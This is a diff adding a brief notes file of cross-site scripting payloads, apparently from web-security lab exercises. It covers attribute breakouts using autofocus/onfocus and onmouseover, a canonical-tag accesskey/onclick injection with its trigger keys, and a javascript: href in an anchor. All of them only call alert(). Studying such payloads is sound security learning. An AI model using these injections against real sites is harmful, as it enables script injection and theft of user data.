@@ -1,0 +1,20 @@
+" autofocus onfocus=alert(document.domain) x="
+
+1- Reflected XSS into attribute with angle brackets HTML-encoded:
+
+example"onmouseover="alert(1)
+
+
+=====================================================================
+2-Canonical tag:
+
+https://web.net/?'accesskey='x'onclick='alert(1)
+
+
+On Windows: ALT+SHIFT+X
+On MacOS: CTRL+ALT+X
+On Linux: Alt+X
+=====================================================================
+3- Stored XSS into anchor href attribute with double quotes HTML-encoded
+
+<a id="author" href="javascript:alert(1)">Click Me</a>
